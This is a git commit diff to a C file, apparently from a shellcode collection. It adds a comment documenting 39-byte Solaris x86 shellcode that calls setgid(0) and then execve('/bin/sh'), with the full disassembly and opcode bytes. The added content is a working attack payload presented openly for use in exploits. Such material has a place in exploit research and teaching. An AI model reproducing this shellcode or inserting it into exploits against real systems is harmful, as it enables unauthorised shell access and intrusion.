719e0b1343a8858b9a5e51fe480baa7d518ed31b
plvhx <gandung@slackerc0de.us>
2022-06-18 17:05:53 +0700

    :)

--- 5-i386.c
+++ 5-i386.c
@@ -5,13 +5,48 @@
 #include <strings.h>
 #endif
 
-#include <sys/types.h>
 #include <sys/mman.h>
+#include <sys/types.h>
 #include <sys/utsname.h>
 #include <sys/wait.h>
 #include <unistd.h>
 
 #include "regs/state.h"
+
+/*
+ * SunOS (Solaris) / x86 setgid(0) + execve("/bin/sh", {"/bin/sh", NULL}, NULL)
+ * 39 bytes shellcode
+ *
+ * Paulus Gandung Prakosa <gandung@lists.infradead.org>
+ *
+ * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
+ *
+ * Disassembly of section .text:
+ *
+ * 08050428 <_start>:
+ * 8050428:       33 f6                   xor    %esi,%esi
+ * 805042a:       56                      push   %esi
+ * 805042b:       56                      push   %esi
+ * 805042c:       33 c0                   xor    %eax,%eax
+ * 805042e:       b0 2e                   mov    $0x2e,%al
+ * 8050430:       50                      push   %eax
+ * 8050431:       cd 91                   int    $0x91
+ * 8050433:       56                      push   %esi
+ * 8050434:       68 6e 2f 73 68          push   $0x68732f6e
+ * 8050439:       68 2f 2f 62 69          push   $0x69622f2f
+ * 805043e:       8b dc                   mov    %esp,%ebx
+ * 8050440:       56                      push   %esi
+ * 8050441:       53                      push   %ebx
+ * 8050442:       8b cc                   mov    %esp,%ecx
+ * 8050444:       56                      push   %esi
+ * 8050445:       56                      push   %esi
+ * 8050446:       51                      push   %ecx
+ * 8050447:       53                      push   %ebx
+ * 8050448:       33 c0                   xor    %eax,%eax
+ * 805044a:       b0 3b                   mov    $0x3b,%al
+ * 805044c:       50                      push   %eax
+ * 805044d:       cd 91                   int    $0x91
+ */
 
 #ifndef unused
 #define unused(x) ((void)(x))
